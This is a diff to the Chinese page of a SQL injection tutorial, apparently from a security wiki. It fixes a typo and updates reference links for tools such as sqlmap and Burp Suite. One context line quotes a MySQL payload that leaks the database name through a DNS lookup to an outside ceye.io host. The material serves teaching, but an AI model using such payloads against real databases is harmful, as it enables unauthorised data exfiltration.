@@ -1,16 +1,16 @@
 [EN](./sqli.md) | [ZH](./sqli-zh.md)
 ## 基本概念
 
--   SQL 注入是一种将 SQL 代码插入或添加到应用（用户）的输入参数中，之后再讲这些参数传递给后台的 SQL 服务器加以解析并执行的攻击。
+-   SQL 注入是一种将 SQL 代码插入或添加到应用（用户）的输入参数中，之后再将这些参数传递给后台的 SQL 服务器加以解析并执行的攻击。
 -   攻击者能够修改 SQL 语句，该进程将与执行命令的组件（如数据库服务器、应用服务器或 WEB 服务器）拥有相同的权限。
 -   如果 WEB 应用开发人员无法确保在将从 WEB 表单、cookie、输入参数等收到的值传递给 SQL 查询（该查询在数据库服务器上执行）之前已经对其进行过验证，通常就会出现 SQL 注入漏洞。
 
 ## 常用工具
 
--   Burp Suite：[Burp Suite 使用介绍](http://static.hx99.net/static/drops/tools-1548.html)
+-   Burp Suite：[Burp Suite 使用介绍](http://drops.xmd5.com/static/drops/tools-1548.html)
 -   Tamper Data (Firefox addon)
 -   HackBar (Firefox addon)
--   sqlmap：[sqlmap 用户手册](http://static.hx99.net/static/drops/tips-143.html)
+-   sqlmap：[sqlmap 用户手册](http://drops.xmd5.com/static/drops/tips-143.html)
 
 ## 注入常见参数
 
@@ -246,8 +246,8 @@ mysql> select load_file(concat('\\\\',(select database()),'.xxx.ceye.io\\abc'));
 
 ## 参考资料
 
--   [SQL 注入速查表](http://static.hx99.net/static/drops/tips-7840.html)
--   [MySQL 注入技巧](http://static.hx99.net/static/drops/tips-7299.html)
--   [MySQL 注入科普](http://static.hx99.net/static/drops/tips-123.html)
+-   [SQL 注入速查表](http://drops.xmd5.com/static/drops/tips-7840.html)
+-   [MySQL 注入技巧](http://drops.xmd5.com/static/drops/tips-7299.html)
+-   [MySQL 注入科普](http://drops.xmd5.com/static/drops/tips-123.html)
 -   [MySQL 注入总结](http://www.91ri.org/4073.html)
 -   [《SQL 注入攻击与防御》](http://product.dangdang.com/23364650.html)
